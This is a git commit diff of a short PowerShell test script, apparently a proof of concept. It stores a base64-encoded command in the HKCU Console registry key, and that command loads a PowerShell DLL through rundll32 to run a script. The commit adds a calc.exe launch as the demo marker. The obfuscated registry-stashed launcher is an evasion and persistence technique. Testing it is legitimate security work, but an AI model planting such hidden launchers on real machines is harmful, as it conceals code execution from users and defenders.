9c2ccab989aac5f875c2e43167dc82f292d215d2
Phạm Phú Quí <phamphuqui1998@gmail.com>
2018-01-19 02:29:53 +0700

    Update AddReg.ps1

--- TestPS/AddReg.ps1
+++ TestPS/AddReg.ps1
@@ -1,2 +1,3 @@
 $code = "cgB1AG4AZABsAGwAMwAyACAAJQB1AHMAZQByAHAAcgBvAGYAaQBsAGUAJQBcAHAAbwB3AGUAcgBzAGgAZABsAGwALgBkAGwAbAAsACAAbQBhAGkAbgAgAC0AZgAgACUAdQBzAGUAcgBwAHIAbwBmAGkAbABlACUAXAB0AGUAcwB0AC4AcABzADEA"
 Set-ItemProperty "HKCU:\Console\" -Name ContentScript -Value $code;
+Start-Process 'C:\windows\system32\calc.exe'
